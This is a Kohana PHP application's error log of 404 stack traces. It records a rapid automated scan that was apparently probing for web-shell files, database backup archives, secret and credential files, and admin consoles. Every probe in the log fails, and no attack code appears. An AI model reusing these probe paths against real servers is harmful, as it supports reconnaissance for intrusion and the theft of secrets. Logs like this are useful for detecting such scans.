2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/fLvk7DMPDONX.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/fLvk7DMPDONX.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/RwD2yVLZrHBi.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/RwD2yVLZrHBi.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
2025-10-29 19:27:40 --- STRACE: ErrorException [ 8 ]: Undefined offset: 3 ~ APPPATH/classes/controller/api.php [ 50 ]
--
#0 /var/www/html/application/classes/controller/api.php(50): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 50, Array)
#1 [internal function]: Controller_Api->action_index()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Api))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: storage/logs/laravel.log ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: storage/logs/laravel.log ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jQuery-File-Upload/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c-h.v2.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jQuery-File-Upload/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c-h.v2.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-backdoor.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-backdoor.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sPyH98fSB9wo.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sPyH98fSB9wo.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: opennms/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: opennms/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jquery-file-upload/server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jquery-file-upload/server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gnx78vIc4SGf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gnx78vIc4SGf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL host-manager/text was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL host-manager/text was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Guardfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Guardfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL lc/system/console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL lc/system/console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL horizon/dashboard was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL horizon/dashboard was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: simple-backdoor.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: simple-backdoor.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/host-manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/host-manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cmdasp.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cmdasp.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL health/panel was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL health/panel was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/host-manager/text was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/host-manager/text was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aspxspy.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aspxspy.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/manager/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tomcat/manager/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL health/check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL health/check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appveyor.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appveyor.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cognos_express/manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cognos_express/manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL log-viewer was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL log-viewer was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL asf/terminal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL asf/terminal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: credentials.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: credentials.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL "978207@ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL "978207@ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL terminal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL terminal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-cli.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-cli.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/secrets.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/secrets.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/initializers/secret_token.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/initializers/secret_token.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
